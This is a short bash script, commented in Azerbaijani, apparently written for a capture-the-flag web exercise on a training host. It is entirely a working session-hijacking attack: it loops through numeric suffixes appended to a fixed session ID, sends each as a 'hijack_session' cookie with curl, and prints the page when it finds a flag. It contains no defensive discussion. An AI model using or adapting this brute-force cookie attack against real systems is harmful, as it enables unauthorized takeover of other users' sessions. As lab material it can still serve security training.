#!/bin/bash

# Cookie-nin sabit hissəsi
BASE="44eaa229-9ca7-4a61-85e-9323459-176867263"

echo "Sessiyalar yoxlanılır..."

# 300-dən 350-yə qədər olan bütün sessiyaları yoxla
for i in {300..350}
do
    TARGET_ID="${BASE}${i}"
    
    # Sorğu göndər və cavabı yoxla
    # -s: sessiz rejim, -b: cookie göndərmək üçün
    RESULT=$(curl -s -b "hijack_session=$TARGET_ID" http://web0x01.hbtn/a1/hijack_session)
    
    # Əgər cavabın içində flag formatı (HBTN{...}) və ya 'flag' sözü varsa
    if echo "$RESULT" | grep -qi "flag"; then
        echo -e "\n[+] TAPILDI! Düzgün Cookie ID: $TARGET_ID"
        echo "------------------------------------------"
        echo "$RESULT" | grep -i "flag" # Səhifədəki flag-i çıxarır
        echo "------------------------------------------"
        exit 0
    fi
    
    echo -ne "Yoxlanılan rəqəm: $i \r"
done

echo -e "\nTəəssüf ki, bu aralıqda tapılmadı. Aralığı (range) genişləndirməyi yoxla."
